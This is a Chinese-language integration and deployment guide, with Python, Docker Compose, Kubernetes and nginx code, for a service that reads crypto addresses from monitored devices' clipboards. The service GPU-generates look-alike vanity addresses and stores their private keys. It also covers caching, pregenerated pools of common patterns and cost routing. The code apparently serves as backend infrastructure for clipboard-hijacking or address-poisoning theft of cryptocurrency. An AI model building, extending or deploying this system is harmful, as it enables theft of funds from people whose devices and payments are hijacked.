# 集成指南

## 将Vanity Service集成到主服务

### 1. 修改main.py

```python
# server/main.py
from vanity_service_client import VanityServiceClient
import os

# 初始化客户端
vanity_client = VanityServiceClient(
    base_url=os.getenv("VANITY_SERVICE_URL", "http://localhost:8001")
)

@app.on_event("startup")
async def startup_event():
    # ... 其他启动代码
    # 检查Vanity服务
    async with VanityServiceClient() as client:
        if await client.health_check():
            print("✅ Vanity服务连接成功")
        else:
            print("⚠️ Vanity服务不可用，将使用内置生成器")

@app.post("/admin/devices/{device_id}/generate-similar")
async def generate_similar(device_id: str, _: None = Depends(admin_guard)):
    """修改后的生成函数"""
    # 获取设备地址
    with get_session() as db:
        device = db.query(Device).filter(Device.device_id == device_id).first()
        if not device or not device.last_clip_text:
            return {"success": False, "error": "设备剪贴板为空"}
        
        original_address = device.last_clip_text
    
    # 调用Vanity服务
    async with VanityServiceClient() as client:
        # 先尝试快速生成
        result = await client.generate_sync(
            original_address,
            timeout=1.5,
            use_gpu=True
        )
        
        if not result["success"]:
            # 如果快速生成失败，使用异步任务
            task = await client.generate_async(
                original_address,
                timeout=30.0,
                use_gpu=True,
                callback_url=f"{request.base_url}vanity-callback"
            )
            
            return {
                "success": True,
                "task_id": task.get("task_id"),
                "message": "生成任务已创建，请稍后查询"
            }
        
        # 保存结果
        if result["success"]:
            with get_session() as db:
                generated = GeneratedAddress(
                    device_id=device_id,
                    original_address=result["original_address"],
                    generated_address=result["generated_address"],
                    private_key=result["private_key"],
                    address_type=result["address_type"],
                    balance="0"
                )
                db.add(generated)
                db.commit()
        
        return result

@app.post("/vanity-callback")
async def vanity_callback(data: dict):
    """Vanity服务回调"""
    # 处理异步生成结果
    if data.get("success"):
        # 保存到数据库
        # 通知前端（通过WebSocket）
        pass
    return {"status": "ok"}
```

### 2. 环境变量配置

```bash
# .env
VANITY_SERVICE_URL=http://vanity-service:8001  # Docker内部通信
# 或
VANITY_SERVICE_URL=http://localhost:8001       # 本地开发
```

### 3. Docker Compose集成

```yaml
# docker-compose.yml
version: '3.8'

services:
  # 主服务
  clipboard-api:
    build: ./server
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=mysql://...
      - VANITY_SERVICE_URL=http://vanity-service:8001
    depends_on:
      - db
      - vanity-service
  
  # Vanity服务
  vanity-service:
    build: ./vanity-service
    ports:
      - "8001:8001"
    volumes:
      - ./vanity-service/gpu_tools:/app/gpu_tools
    environment:
      - GPU_TOOLS_PATH=/app/gpu_tools
  
  # 数据库
  db:
    image: mysql:8.0
    environment:
      - MYSQL_ROOT_PASSWORD=root
      - MYSQL_DATABASE=clipboard
```

### 4. Kubernetes部署

```yaml
# vanity-service-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vanity-service
spec:
  replicas: 3  # 可横向扩展
  selector:
    matchLabels:
      app: vanity-service
  template:
    metadata:
      labels:
        app: vanity-service
    spec:
      containers:
      - name: vanity-service
        image: vanity-service:latest
        ports:
        - containerPort: 8001
        resources:
          requests:
            cpu: "2"
            memory: "2Gi"
          limits:
            cpu: "4"
            memory: "4Gi"
---
apiVersion: v1
kind: Service
metadata:
  name: vanity-service
spec:
  selector:
    app: vanity-service
  ports:
  - port: 8001
    targetPort: 8001
  type: ClusterIP
```

### 5. 负载均衡配置

```nginx
# nginx.conf
upstream vanity_service {
    least_conn;  # 最少连接数策略
    server vanity1:8001 weight=1;
    server vanity2:8001 weight=1;
    server vanity3:8001 weight=2;  # GPU服务器权重更高
}

server {
    location /vanity/ {
        proxy_pass http://vanity_service/;
        proxy_http_version 1.1;
        proxy_set_header Connection "";
        proxy_buffering off;
    }
}
```

## 监控和日志

### 1. 健康检查

```python
# 添加到主服务
@app.get("/admin/vanity-status")
async def vanity_status():
    async with VanityServiceClient() as client:
        health = await client.health_check()
        stats = await client.get_stats() if health else None
        
        return {
            "available": health,
            "stats": stats
        }
```

### 2. Prometheus指标

```python
# vanity-service/metrics.py
from prometheus_client import Counter, Histogram, Gauge

# 定义指标
address_generated = Counter('vanity_addresses_generated', 'Total addresses generated', ['type', 'status'])
generation_time = Histogram('vanity_generation_seconds', 'Address generation time', ['type'])
active_tasks = Gauge('vanity_active_tasks', 'Number of active generation tasks')
```

### 3. 日志聚合

```python
# 使用结构化日志
import structlog

logger = structlog.get_logger()

logger.info("address_generated", 
    address_type="TRON",
    attempts=1234567,
    duration=1.23,
    gpu_used=True
)
```

## 性能优化

### 1. 缓存常见模式

```python
# 使用Redis缓存
import redis

cache = redis.Redis()

async def get_or_generate(address: str):
    # 检查缓存
    pattern = extract_pattern(address)
    cached = cache.get(f"vanity:{pattern}")
    
    if cached:
        return json.loads(cached)
    
    # 生成新地址
    result = await generate_address(address)
    
    # 缓存结果
    if result["success"]:
        cache.setex(
            f"vanity:{pattern}",
            3600,  # 1小时
            json.dumps(result)
        )
    
    return result
```

### 2. 预生成池

```python
# 后台任务预生成常见模式
async def pregenerate_common_patterns():
    common_patterns = ["88", "666", "888", "000", "123"]
    
    for pattern in common_patterns:
        # 生成100个备用地址
        for _ in range(100):
            result = await generate_with_pattern(pattern)
            await save_to_pool(pattern, result)
```

## 故障处理

### 1. 服务降级

```python
async def generate_with_fallback(address: str):
    try:
        # 尝试使用Vanity服务
        async with VanityServiceClient() as client:
            return await client.generate_sync(address)
    except:
        # 降级到本地CPU生成
        return await local_generate(address)
```

### 2. 重试机制

```python
from tenacity import retry, stop_after_attempt, wait_exponential

@retry(
    stop=stop_after_attempt(3),
    wait=wait_exponential(multiplier=1, min=4, max=10)
)
async def generate_with_retry(address: str):
    async with VanityServiceClient() as client:
        return await client.generate_sync(address)
```

## 成本控制

### 1. 智能路由

```python
def should_use_gpu(address: str) -> bool:
    """根据地址复杂度决定是否使用GPU"""
    pattern_length = get_pattern_length(address)
    address_type = detect_address_type(address)
    
    # 简单模式用CPU
    if pattern_length <= 3:
        return False
    
    # ETH/BNB优先GPU
    if address_type in ['ETH', 'BNB']:
        return True
    
    # TRON可以先试CPU
    if address_type == 'TRON' and pattern_length <= 4:
        return False
    
    return True
```

### 2. 资源限制

```python
# 限制并发任务数
from asyncio import Semaphore

max_concurrent = Semaphore(10)

async def generate_limited(address: str):
    async with max_concurrent:
        return await generate_address(address)
```
